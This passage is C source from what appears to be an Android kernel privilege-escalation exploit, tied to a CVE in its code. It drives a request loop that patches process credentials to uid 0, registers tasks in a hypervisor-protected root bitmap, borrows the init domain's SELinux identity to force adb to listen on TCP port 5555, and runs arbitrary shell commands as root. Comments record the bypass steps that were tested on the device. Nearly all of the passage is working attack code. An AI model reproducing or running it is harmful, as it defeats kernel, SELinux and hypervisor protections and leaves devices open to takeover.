              off = off * 10u + (unsigned long)(*q - '0');
              q++;
            }
            int f = open("/data/local/tmp/.l5sh.log", O_RDONLY | O_CLOEXEC);
            char dl[3000];
            int got = 0;
            unsigned long end = off;
            if (f >= 0) {
              (void)lseek(f, (off_t)off, SEEK_SET);
              got = (int)read(f, dl, sizeof(dl) - 1);
              if (got < 0) {
                got = 0;
              }
              dl[got] = 0;
              end = off + (unsigned long)got;
              close(f);
            }
            sn = snprintf(sb, sizeof(sb), "session=up\nshout=1\noff=%lu\nnext=%lu\n---\n",
                          off, end);
            int fgo = open(
                "/sdcard/Android/data/com.l5.root/files/l5/out.txt",
                O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0666);
            if (fgo >= 0) {
              if (sn > 0) {
                (void)write(fgo, sb,
                            (size_t)(sn < (int)sizeof(sb) ? sn : (int)sizeof(sb) - 1));
              }
              if (got > 0) {
                (void)write(fgo, dl, (size_t)got);
              }
              close(fgo);
            }
            pr_info("shout off=%lu next=%lu got=%d\n", off, end, got);
          }
          if (rn >= 6 && !strncmp(rb, "shkill", 6)) {
            if (g_shfd >= 0) {
              close(g_shfd);
              g_shfd = -1;
            }
            if (g_shpid) {
              (void)kill((pid_t)g_shpid, 9);
              g_shpid = 0;
            }
            pr_info("shkill done\n");
          }
          if (rn >= 7 && !strncmp(rb, "initcfg", 7)) {
            /*
             * Persist the adb TCP port the only way this device allows it.
             *
             * Measured (g86): as uid 0 in the shell domain,
             *   setprop persist.adb.tcp.port 5555 -> "Failed to set property"
             *   /data/property                       -> Permission denied
             *   /data/misc/adb/adb_keys              -> Permission denied
             * i.e. all three are SELinux-domain denials, not DAC.
             *
             * The policy grants `(allow init property_type (property_service
             * (set)))`, so the one process class that CAN persist the port is the
             * init domain -- and init must not exec (execve recomputes the domain
             * from the entrypoint and drops init).  So the child borrows ONLY the
             * SELinux sid (patch_cred_sid, the L5 borrow) and calls
             * __system_property_set IN-PROCESS.  Its uid stays 2000, so HKIP's
             * uid-root checks are not involved at all, and nothing forks from a
             * patched task.
             *
             * Once this sticks, adbd listens on TCP from boot and an on-phone app
             * can talk to 127.0.0.1:5555 without any PC in the loop.
             */
            int lfi = open("/data/local/tmp/l5r.log",
                           O_WRONLY | O_CREAT | O_APPEND | O_CLOEXEC, 0666);
            char lbi[224];
            char vali[24];
            memset(vali, 0, sizeof(vali));
            strcpy(vali, "5555");
            const char* qi = rb + 7;
            while (*qi == ' ') {
              qi++;
            }
            int ki = 0;
            while (*qi >= '0' && *qi <= '9' && ki < 20) {
              vali[ki++] = *qi++;
            }
            if (ki == 0) {
              strcpy(vali, "5555");
            }
            /* isolating switch: "initcfg 5555 nopatch" runs the child's body
             * WITHOUT switching its SELinux domain, to tell an abort caused by
             * patch_cred_sid apart from one caused by the property call itself. */
            int nopatch = (strstr(rb, "nopatch") != NULL);
            int rpi[2] = {-1, -1};
            int cpi[2] = {-1, -1};
            int chi = 0, sidok = 0, seti = -9, keyi = -9;
            if (pipe(rpi) == 0 && pipe(cpi) == 0) {
              chi = (int)fork();
              if (chi == 0) {
                (void)prctl(PR_SET_NAME, (unsigned long)"l5init", 0, 0, 0);
                if (cpi[1] >= 0) {
                  (void)write(cpi[1], "1", 1);
                }
                if (rpi[0] >= 0) {
                  char one = 0;
                  (void)read(rpi[0], &one, 1);
                }
                errno = 0;
                int rc1 = __system_property_set("persist.adb.tcp.port", vali);
                errno = 0;
                int rc2 = -1;
                int kf = open("/data/misc/adb/adb_keys",
                              O_WRONLY | O_APPEND | O_CLOEXEC);
                if (kf >= 0) {
                  rc2 = (int)write(kf, "\n", 1);
                  close(kf);
                }
                int rr[4] = {rc1, rc2, (int)errno, 0};
                if (cpi[1] >= 0) {
                  (void)write(cpi[1], rr, sizeof(rr));
                }
                _exit(0);
              }
              if (chi > 0) {
                if (cpi[0] >= 0) {
                  char one = 0;
                  (void)read(cpi[0], &one, 1);
                }
                uint64_t ti = nopatch ? 0 : find_task_by_comm(fd, "l5init");
                uint64_t ci =
                    is_direct_ptr(ti) ? root_read64(fd, ti + TASK_CRED_OFF) : 0;
                sidok = nopatch ? -2 : (is_direct_ptr(ci) ? patch_cred_sid(fd, ci) : 0);
                /*
                 * ALWAYS release the child.  g87/g88 deadlocked exactly here:
                 * when the child was not found it stayed blocked on the pipe while
                 * the parent waited for its results, so the whole request loop
                 * froze and no log line was ever written.
                 */
                if (rpi[1] >= 0) {
                  (void)write(rpi[1], "1", 1);
                }
                int rr[4] = {-9, -9, -9, -9};
                if (cpi[0] >= 0) {
                  /* Bounded wait.  g89 showed the child can die before writing
                   * its results (its domain is switched to init right before it
                   * calls the property service), and a blocking read here froze
                   * the whole request loop. */
                  fd_set fsi;
                  FD_ZERO(&fsi);
                  FD_SET(cpi[0], &fsi);
                  struct timeval tvi;
                  tvi.tv_sec = 3;
                  tvi.tv_usec = 0;
                  if (select(cpi[0] + 1, &fsi, NULL, NULL, &tvi) > 0) {
                    (void)read(cpi[0], rr, sizeof(rr));
                  }
                }
                seti = rr[0];
                keyi = rr[1];
              }
            }
            if (rpi[0] >= 0) {
              close(rpi[0]);
            }
            if (rpi[1] >= 0) {
              close(rpi[1]);
            }
            if (cpi[0] >= 0) {
              close(cpi[0]);
            }
            if (cpi[1] >= 0) {
              close(cpi[1]);
            }
            char goti[PROP_VALUE_MAX];
            memset(goti, 0, sizeof(goti));
            __system_property_get("persist.adb.tcp.port", goti);
            if (lfi >= 0) {
              int n10 = snprintf(lbi, sizeof(lbi),
                                 "initcfg child=%d sid=%d setprop=%d key=%d val=%s "
                                 "now=%s\n",
                                 chi, sidok, seti, keyi, vali, goti);
              if (n10 > 0) {
                (void)write(lfi, lbi, (size_t)n10);
                (void)fsync(lfi);
              }
              close(lfi);
            }
            pr_info("initcfg child=%d sid=%d setprop=%d key=%d val=%s now=%s\n", chi,
                    sidok, seti, keyi, vali, goti);
            sn = snprintf(sb, sizeof(sb),
                          "session=up\ninitcfg=1\nchild=%d\nsid=%d\nsetprop=%d\n"
                          "key=%d\nval=%s\nnow=%s\n",
                          chi, sidok, seti, keyi, vali, goti);
            int fgi = open(
                "/sdcard/Android/data/com.l5.root/files/l5/status.txt",
                O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0666);
            if (fgi >= 0) {
              if (sn > 0) {
                (void)write(fgi, sb,
                            (size_t)(sn < (int)sizeof(sb) ? sn : (int)sizeof(sb) - 1));
              }
              close(fgi);
            }
          }
          if (rn >= 7 && !strncmp(rb, "srvroot", 7)) {
            /*
             * Serve-mode root.  The gate NEVER touches its own cred (it must keep
             * reading /sdcard), and only the forked child becomes uid 0:
             *   1. the child renames itself to "l5root" and blocks on a pipe, so
             *      the parent can find it with find_task_by_comm() -- no pid walk
             *      (g77/g80: the walk cannot find our own tid at request time);
             *   2. the parent reads the child's bit from the EL2 bitmap and, if
             *      absent, injects once for the child's byte (g82: 0 -> 1 works);
             *   3. the parent patches the CHILD's cred -- fork copies the
             *      credential (copy_creds -> prepare_creds), so patching the
             *      parent's object does nothing (measured g82) -- then releases
             *      the child, whose execve keeps uid 0.
             * Because the gate's cred is untouched, this verb can be issued again
             * and again inside one boot.
             */
            int lfv = open("/data/local/tmp/l5r.log",
                           O_WRONLY | O_CREAT | O_APPEND | O_CLOEXEC, 0666);
            char lbv[224];
            int fcv = open(
                "/sdcard/Android/data/com.l5.root/files/l5/cmd.txt",
                O_RDONLY | O_CLOEXEC);
            int fov = open(
                "/sdcard/Android/data/com.l5.root/files/l5/out.txt",
                O_RDWR | O_CREAT | O_TRUNC | O_CLOEXEC, 0666);
            char cmdv[160];
            int cnv = 0;
            cmdv[0] = 0;
            if (fcv >= 0) {
              cnv = (int)read(fcv, cmdv, sizeof(cmdv) - 1);
              if (cnv > 0) {
                cmdv[cnv] = 0;
              } else {
                cnv = 0;
              }
            }
            int rpv[2] = {-1, -1};
            int cpv[2] = {-1, -1};
            int chv = 0, cbit = 0, pv = 0, ov = 0, injv = 0, found = 0;
            uint64_t ctv = 0, ccv = 0;
            if (pipe(rpv) == 0 && pipe(cpv) == 0) {
              chv = (int)fork();
              if (chv == 0) {
                (void)prctl(PR_SET_NAME, (unsigned long)"l5root", 0, 0, 0);
                if (cpv[1] >= 0) {
                  (void)write(cpv[1], "1", 1);
                }
                if (rpv[0] >= 0) {
                  char one = 0;
                  (void)read(rpv[0], &one, 1);
                }
                if (fov >= 0) {
                  (void)dup2(fov, 1);
                  (void)dup2(fov, 2);
                }
                execl("/system/bin/sh", "sh", "-c", cnv > 0 ? cmdv : "id",
                      (char*)0);
                _exit(127);
              }
              if (chv > 0) {
                if (cpv[0] >= 0) {
                  char one = 0;
                  (void)read(cpv[0], &one, 1);
                }
                uintptr_t bmv = text_addr(HKIP_UID_ROOT_BITS);
                uint64_t bbv = (uint64_t)((uint32_t)chv >> 3);
                uint8_t bvv = 0;
                cbit = kernel_read_data(fd, bmv + (uintptr_t)bbv, &bvv, 1) == 1 &&
                       (bvv & (uint8_t)(1u << ((uint32_t)chv & 7u))) != 0;
                if (lfv >= 0) {
                  int n8 = snprintf(lbv, sizeof(lbv),
                                    "srvroot step child=%d cbit=%d\n", chv, cbit);
                  if (n8 > 0) {
                    (void)write(lfv, lbv, (size_t)n8);
                    (void)fsync(lfv);
                  }
                }
                if (!cbit) {
                  injv = hvc_grant_uid_bit(fd, (unsigned long)(uint32_t)chv);
                  bvv = 0;
                  cbit = kernel_read_data(fd, bmv + (uintptr_t)bbv, &bvv, 1) == 1 &&
                         (bvv & (uint8_t)(1u << ((uint32_t)chv & 7u))) != 0;
                }
                if (cbit) {
                  ctv = find_task_by_comm(fd, "l5root");
                  found = is_direct_ptr(ctv);
                  ccv = found ? root_read64(fd, ctv + TASK_CRED_OFF) : 0;
                  if (lfv >= 0) {
                    int n9 = snprintf(lbv, sizeof(lbv),
                                      "srvroot step2 task=%016llx cred=%016llx\n",
                                      (unsigned long long)ctv,
                                      (unsigned long long)ccv);
                    if (n9 > 0) {
                      (void)write(lfv, lbv, (size_t)n9);
                      (void)fsync(lfv);
                    }
                  }
                  if (is_direct_ptr(ccv)) {
                    pv = patch_cred_identity(fd, ccv);
                  }
                  if (pv && rpv[1] >= 0) {
                    (void)write(rpv[1], "1", 1);
                  }
                } else {
                  (void)kill(chv, 9);
                }
                char ob[96];
                for (int w = 0; w < 40 && pv; w++) {
                  usleep(50000);
                  if (fov >= 0 && pread(fov, ob, sizeof(ob) - 1, 0) > 0) {
                    ov = 1;
                    break;
                  }
                }
              }
            }
            if (rpv[0] >= 0) {
              close(rpv[0]);
            }
            if (rpv[1] >= 0) {
              close(rpv[1]);
            }
            if (cpv[0] >= 0) {
              close(cpv[0]);
            }
            if (cpv[1] >= 0) {
              close(cpv[1]);
            }
            if (fcv >= 0) {
              close(fcv);
            }
            if (fov >= 0) {
              close(fov);
            }
            if (lfv >= 0) {
              int n7 = snprintf(lbv, sizeof(lbv),
                                "srvroot inj=%d child=%d cbit=%d task=%016llx "
                                "cred=%016llx found=%d patch=%d ov=%d cmd=%s\n",
                                injv, chv, cbit, (unsigned long long)ctv,
                                (unsigned long long)ccv, found, pv, ov, cmdv);
              if (n7 > 0) {
                (void)write(lfv, lbv, (size_t)n7);
                (void)fsync(lfv);
              }
              close(lfv);
            }
            pr_info("srvroot inj=%d child=%d cbit=%d task=%016llx cred=%016llx "
                    "found=%d patch=%d ov=%d\n",
                    injv, chv, cbit, (unsigned long long)ctv,
                    (unsigned long long)ccv, found, pv, ov);
            sn = snprintf(sb, sizeof(sb),
                          "session=up\nsrvroot=1\nchild=%d\ncbit=%d\nfound=%d\n"
                          "patch=%d\nout=%d\n",
                          chv, cbit, found, pv, ov);
            int fgv = open(
                "/sdcard/Android/data/com.l5.root/files/l5/status.txt",
                O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0666);
            if (fgv >= 0) {
              if (sn > 0) {
                (void)write(fgv, sb,
                            (size_t)(sn < (int)sizeof(sb) ? sn : (int)sizeof(sb) - 1));
              }
              close(fgv);
            }
          }
          if (rn > 7 && !strncmp(rb, "rootexec", 8)) {
            if (gate_selfrooted) {
              /* Already uid 0 with a registered bit; forking here would create
               * an unregistered root task and reset the device. */
              pr_info("rootexec refused: gate is selfrooted\n");
              continue;
            }
            /*
             * "rootexec": the gate produces a root shell for the manager app.
             *
             * This is the ONE shape §13 already proved: a *plain* process forks
             * a child that spins without exec'ing, the child's tid is registered
             * with EL2 through the kernel's own HVC, its cred is set to uid 0
             * (domain untouched => shell, which owns `entrypoint` on
             * shell_exec), and only then is the child released to exec.
             * Nothing that has been identity-patched ever forks.
             *
             * The app never gets its own process patched: it writes cmd.txt,
             * drops "rootexec" into req.txt and reads out.txt.
             */
            static const char* kreq =
                "/sdcard/Android/data/com.l5.root/files/l5/";
            char cmdpath[96];
            char outpath[96];
            char gopath[96];
            snprintf(cmdpath, sizeof(cmdpath), "%scmd.txt", kreq);
            snprintf(outpath, sizeof(outpath), "%sout.txt", kreq);
            snprintf(gopath, sizeof(gopath), "%sgo", kreq);
            (void)unlink(gopath);
            /*
             * Open BOTH files here, while we are still uid 2000 and the owner of
             * /sdcard/Android/data/com.l5.root/files/l5.  Measured (g7): the
             * released child reached uid 0 but every *open* of that directory
             * then failed, because sdcardfs/FUSE scopes the app dir by uid and
             * uid 0 is not the app.  A pre-opened fd is inherited across fork
             * and exec, so the child never has to open anything.
             */
            int cfd = open(cmdpath, O_RDONLY | O_CLOEXEC);
            int ofd = open(outpath, O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC,
                           0666);
            if (cfd < 0 || ofd < 0) {
              pr_info("rootexec open failed cfd=%d ofd=%d errno=%d\n", cfd, ofd,
                      errno);
            }
            /*
             * The release signal is a pipe, not a file: after the cred patch the
             * child is uid 0 and every path lookup under the app's sdcard dir
             * fails (sdcardfs scopes it by uid), so a file-based flag would make
             * it spin for the full timeout.
             */
            int pr5[2] = {-1, -1};
            if (pipe(pr5) != 0) {
              pr5[0] = pr5[1] = -1;
            }
            pid_t cp = fork();
            if (cp == 0) {
              /* child: block until released, then become the shell */
              if (pr5[0] >= 0) {
                char one = 0;
                (void)read(pr5[0], &one, 1);
                close(pr5[0]);
              }
              if (pr5[1] >= 0) {
                close(pr5[1]);
              }
              char cmdb[1024];
              int cn = cfd >= 0 ? (int)read(cfd, cmdb, sizeof(cmdb) - 1) : -1;
              if (cn <= 0) {
                /* Instrumented: with the output fd already inherited, a silent
                 * _exit() was indistinguishable from a failed exec. */
                if (ofd >= 0) {
                  char m[48];
                  int mn = snprintf(m, sizeof(m), "nocmd cfd=%d cn=%d errno=%d\n",
                                    cfd, cn, errno);
                  (void)write(ofd, m, (size_t)mn);
                }
                _exit(126);
              }
              cmdb[cn] = '\0';
              for (int i = 0; i < cn; i++) {
                if (cmdb[i] == '\n') {
                  cmdb[i] = ' ';
                }
              }
              if (ofd >= 0) {
                dup2(ofd, 1);
                dup2(ofd, 2);
              }
              if (ofd >= 0) {
                char m[48];
                int mn = snprintf(m, sizeof(m), "exec argv=[%s]\n", cmdb);
                (void)write(ofd, m, (size_t)mn);
              }
              execl("/system/bin/sh", "sh", "-c", cmdb, (char*)NULL);
              {
                char m[48];
                int mn = snprintf(m, sizeof(m), "exec failed errno=%d\n", errno);
                (void)write(2, m, (size_t)mn);
              }
              _exit(127);
            }
            int b5 = 0;
            int p5 = 0;
            uint32_t u5 = 0xffffffffu;
            if (cp > 0) {
              usleep(250000);
              uint64_t t5 = find_task_by_tgid(fd, (uint32_t)cp);
              uint64_t c5 =
                  is_direct_ptr(t5) ? root_read64(fd, t5 + TASK_CRED_OFF) : 0;
              b5 = hvc_grant_uid_bit(fd, (unsigned long)cp);
              p5 = is_direct_ptr(c5) ? patch_cred_identity(fd, c5) : 0;
              u5 = is_direct_ptr(c5)
                  ? root_read32(fd, c5 + CRED_UID_OFF) : 0xffffffffu;
              int gf = 1;
              if (pr5[1] >= 0) {
                (void)write(pr5[1], "1", 1);
                close(pr5[1]);
                pr5[1] = -1;
              } else {
                gf = 0;
              }
              pr_info("rootexec release=%d\n", gf);
            }
            if (pr5[0] >= 0) {
              close(pr5[0]);
            }
            if (cfd >= 0) {
              close(cfd);
            }
            if (ofd >= 0) {
              close(ofd);
            }
            pr_info("rootexec child=%d bit=%d patch=%d uid=%u\n", (int)cp, b5, p5,
                    u5);
            sn = snprintf(sb, sizeof(sb),
                          "session=up\nrootexec=%d\nbit=%d\npatch=%d\nuid=%u\n",
                          (int)cp, b5, p5, u5);
            int sf5 = open(
                "/sdcard/Android/data/com.l5.root/files/l5/status.txt",
                O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0666);
            if (sf5 >= 0) {
              if (sn > 0) {
                (void)write(sf5, sb,
                            (size_t)(sn < (int)sizeof(sb) ? sn : (int)sizeof(sb) - 1));
              }
              close(sf5);
            }
          }
          if (rn > 8 && !strncmp(rb, "hvcrooti", 8)) {
            /*
             * Same as hvcroot, but also copies pid 1's SELinux sid so the target
             * runs in the init domain (which is allowed to mount) instead of
             * kernel's, which has no executable entrypoint.
             */
            const char *q3 = rb + 8;
            while (*q3 == ' ') {
              q3++;
            }
            uint32_t tid3 = 0;
            for (; *q3 >= '0' && *q3 <= '9'; q3++) {
              tid3 = tid3 * 10u + (uint32_t)(*q3 - '0');
            }
            uint32_t o1 = 0;
            uint32_t s1v = 0;
            uint64_t p1t = find_task_by_tgid(fd, 1);
            uint64_t p1c =
                is_direct_ptr(p1t) ? root_read64(fd, p1t + TASK_CRED_OFF) : 0;
            uint64_t p1s =
                is_direct_ptr(p1c) ? root_read64(fd, p1c + CRED_SECURITY_OFF) : 0;
            if (is_direct_ptr(p1s)) {
              o1 = root_read32(
                  fd, p1s + selinux_cred_blob_off + SELINUX_CRED_OSID_OFF);
              s1v = root_read32(
                  fd, p1s + selinux_cred_blob_off + SELINUX_CRED_SID_OFF);
            }
            target_cred_osid = o1;
            target_cred_sid = s1v;
            int bok3 = tid3 ? hvc_grant_uid_bit(fd, (unsigned long)tid3) : 0;
            uint64_t bt3 = tid3 ? find_task_by_tgid(fd, tid3) : 0;
            uint64_t bc3 =
                is_direct_ptr(bt3) ? root_read64(fd, bt3 + TASK_CRED_OFF) : 0;
            int cok3 = is_direct_ptr(bc3) ? patch_cred_object(fd, bc3) : 0;
            pr_info("hvcrooti tid=%u init_osid=%u init_sid=%u bit=%d patch=%d\n",
                    tid3, o1, s1v, bok3, cok3);
          }
          if (rn > 7 && !strncmp(rb, "hvcroot", 7)) {
            /*
             * Register an ARBITRARY tid as a legitimate root task using the
             * kernel's own HKIP HVC (ROWM_WRITE_8 into the EL2-owned bitmap),
             * then make it uid 0.  This is the sideways route: HKIP's
             * authoritative state lives in EL2, and only an HVC can update it.
             */
            const char *q2 = rb + 7;
            while (*q2 == ' ') {
              q2++;
            }
            uint32_t tid = 0;
            for (; *q2 >= '0' && *q2 <= '9'; q2++) {
              tid = tid * 10u + (uint32_t)(*q2 - '0');
            }
            int bok = tid ? hvc_grant_uid_bit(fd, (unsigned long)tid) : 0;
            uint64_t bt = tid ? find_task_by_tgid(fd, tid) : 0;
            uint64_t bc =
                is_direct_ptr(bt) ? root_read64(fd, bt + TASK_CRED_OFF) : 0;
            int cok = is_direct_ptr(bc) ? patch_cred_identity(fd, bc) : 0;
            pr_info("hvcroot tid=%u bit=%d task=%016llx patch=%d\n", tid, bok,
                    (unsigned long long)bt, cok);
          }
          if (rn > 6 && !strncmp(rb, "grant", 5) && rb[5] != 's') {
            int withsid = rb[5] == 'x';
            const char *q = rb + 5 + (withsid ? 1 : 0);
            while (*q == ' ') {
              q++;
            }
            uint32_t tg = 0;
            for (; *q >= '0' && *q <= '9'; q++) {
              tg = tg * 10u + (uint32_t)(*q - '0');
            }
            uint64_t gt = tg ? find_task_by_tgid(fd, tg) : 0;
            uint64_t gc =
                is_direct_ptr(gt) ? root_read64(fd, gt + TASK_CRED_OFF) : 0;
            /* "grantx <pid>" also copies the L5 (init) security blob, so the
             * target is uid 0 *and* in a root domain; "grant" leaves its own
             * domain alone.  Measured because a patched shell that forks
             * rebooted the device. */
            int gok = 0;
            if (is_direct_ptr(gc)) {
              /* EL2 bit first, via the kernel's own HVC: an EL1 write into the
               * bitmap is ignored (ROWM), which is why "grant" targets used to
               * die shortly after being patched. */
              int b0 = hvc_grant_uid_bit(fd, (unsigned long)found_task_pid);
              int b1 = hvc_grant_uid_bit(fd, (unsigned long)(found_task_pid + 8));
              pr_info("grant bits=%d/%d pid=%u\n", b0, b1, found_task_pid);
              gok = withsid ? patch_cred_object(fd, gc)
                            : patch_cred_identity(fd, gc);
            }
            pr_info("grant req=%u hit pid=%u tgid=%u self=%d\n", tg,
                    found_task_pid, found_task_tgid,
                    gt == current_task_addr);
            uint32_t gu = is_direct_ptr(gc)
                ? root_read32(fd, gc + CRED_UID_OFF) : 0xffffffffu;
            pr_info("grant tgid=%u task=%016llx cred=%016llx ok=%d uid=%u\n",
                    tg, (unsigned long long)gt, (unsigned long long)gc, gok, gu);
            /* The kernel's own view of the target's domain, read back through
             * procfs so the log records it even when the host cannot. */
            {
              char gpath[40];
              snprintf(gpath, sizeof(gpath), "/proc/%u/attr/current", tg);
              int gf = open(gpath, O_RDONLY | O_CLOEXEC);
              if (gf >= 0) {
                char gctx[64] = {0};
                int gn = (int)read(gf, gctx, sizeof(gctx) - 1);
                close(gf);
                if (gn > 0) {
                  gctx[gn] = '\0';
                  pr_info("grant ctx=%s\n", gctx);
                }
              }
            }
            /* Publish the result so the manager can show it. */
            sn = snprintf(sb, sizeof(sb),
                          "session=up\ndomain=%s\ngrant=%u\nuid=%u\nok=%d\n",
                          jctx, tg, gu, gok);
            int sf2 = open(
                "/sdcard/Android/data/com.l5.root/files/l5/status.txt",
                O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0666);
            if (sf2 >= 0) {
              if (sn > 0) {
                (void)write(sf2, sb,
                            (size_t)(sn < (int)sizeof(sb) ? sn : (int)sizeof(sb) - 1));
              }
              close(sf2);
            }
          }
          }
        } else {
          pr_info("e2e req empty errno=%d\n", errno);
        }
      } else {
        pr_info("e2e req open failed errno=%d\n", errno);
      }
      if (!getenv("CVE43499_SERVE")) {
        break;
      }
      usleep(300000);
      }
    }
    (void)cur;
    if (lfd >= 0) {
      close(lfd);
    }
  }
#ifdef TASK_HKIP_XID_OFF
  if (root_child_done && root_shared) {
    hkip_service_windows(fd);
  } else if (root_child_pid > 0) {
    waitpid(root_child_pid, NULL, 0);
  }
#endif
  struct root_report report;
  memset(&report, 0, sizeof(report));
  if (root_shared) {
    report = root_shared->report;
  }
  capable_head_after = root_read64(fd, capable_head);
  root_read_data(fd, selinux_addr, &selinux_after, sizeof(selinux_after));
  pr_info("root child result done=%d uid_after=%u setgid=%d/%d setuid=%d/%d "
          "setenforce=%d/%d su=%d/%d daemon=%d selinux=%u->%u "
          "cap=%016llx/%016llx\n",
          root_child_done, root_uid_after, report.setgid_ret,
          report.setgid_errno, report.setuid_ret, report.setuid_errno,
          setenforce_ret, setenforce_errno, report.su_install_ret,
          report.su_install_errno, report.su_daemon_pid,
          selinux_before, selinux_after,
          (unsigned long long)capable_head_before,
          (unsigned long long)capable_head_after);
  return root_child_done && selinux_after == 0;
}
